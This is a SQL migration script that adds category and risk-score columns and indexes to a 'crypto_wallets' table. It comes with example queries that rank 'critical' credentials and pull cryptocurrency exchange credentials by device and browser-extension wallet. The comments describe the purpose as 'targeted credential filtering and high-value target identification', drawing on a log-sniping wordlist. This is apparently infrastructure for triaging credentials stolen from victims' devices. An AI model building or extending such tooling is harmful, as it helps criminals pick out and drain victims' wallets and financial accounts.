-- Migration: Add Category Detection and Risk Scoring
-- Description: Adds category tagging and risk scoring inspired by logSniper's wordlist system
-- Purpose: Enable targeted credential filtering and high-value target identification

-- Add category and risk fields to crypto_wallets
ALTER TABLE crypto_wallets
  ADD COLUMN IF NOT EXISTS categories JSON NULL COMMENT 'Array of detected categories (crypto, banking, cloud, etc.)',
  ADD COLUMN IF NOT EXISTS primary_category VARCHAR(50) NULL COMMENT 'Primary/highest-risk category',
  ADD COLUMN IF NOT EXISTS risk_level ENUM('critical', 'high', 'medium', 'low', 'unknown') DEFAULT 'unknown' COMMENT 'Risk level based on category',
  ADD COLUMN IF NOT EXISTS risk_score INT DEFAULT 0 COMMENT 'Risk score 0-100';

-- Add indexes for category queries
CREATE INDEX IF NOT EXISTS idx_primary_category ON crypto_wallets(primary_category);
CREATE INDEX IF NOT EXISTS idx_risk_level ON crypto_wallets(risk_level);
CREATE INDEX IF NOT EXISTS idx_risk_score ON crypto_wallets(risk_score);

-- Composite index for high-value target queries
CREATE INDEX IF NOT EXISTS idx_risk_category ON crypto_wallets(risk_level, primary_category);

-- Update table comment
ALTER TABLE crypto_wallets COMMENT = 'Enhanced crypto wallet data with category detection, risk scoring, and HD wallet support';

-- Example queries after migration:

-- Find all CRITICAL risk credentials (crypto exchanges, banks):
-- SELECT * FROM crypto_wallets
-- WHERE risk_level = 'critical'
-- ORDER BY risk_score DESC;

-- Get high-value targets by category:
-- SELECT primary_category, COUNT(*) as count,
--        AVG(risk_score) as avg_risk
-- FROM crypto_wallets
-- WHERE risk_level IN ('critical', 'high')
-- GROUP BY primary_category
-- ORDER BY avg_risk DESC;

-- Find cryptocurrency exchange credentials:
-- SELECT device_id, address, wallet_name, risk_score
-- FROM crypto_wallets
-- WHERE primary_category = 'crypto'
-- AND wallet_type = 'browser_extension'
-- ORDER BY risk_score DESC;

-- Get risk distribution:
-- SELECT risk_level, COUNT(*) as count
-- FROM crypto_wallets
-- GROUP BY risk_level
-- ORDER BY
--   CASE risk_level
--     WHEN 'critical' THEN 1
--     WHEN 'high' THEN 2
--     WHEN 'medium' THEN 3
--     WHEN 'low' THEN 4
--     ELSE 5
--   END;
